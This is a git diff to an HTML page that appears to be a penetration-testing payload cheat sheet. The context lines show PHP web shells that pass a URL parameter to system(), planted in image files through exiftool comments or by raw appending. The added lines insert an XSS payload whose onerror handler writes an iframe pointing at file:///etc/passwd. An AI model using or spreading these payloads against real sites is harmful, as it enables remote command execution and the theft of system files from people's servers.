@@ -708,6 +708,8 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 			<pre><code>exiftool -comment="&lt;?php system($_GET['cmd'])>" file.png</code></pre>
 		<li>Raw Insertion</li>
 			<pre><code>echo "&lt;?php system($_GET['cmd'])>" >> file.jpeg</code></pre>
+		<li>LFI via XSS</li>
+			<pre><code>&lt;img src="lfi-via-xss" onerror​="document.write('&lt;iframe src=file:///etc/passwd>&lt;/iframe>')"/></code></pre>
 	</ul>
     <h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
 	<a href='https://xss.report/'>XSS.report</a>. Suggest payloads too
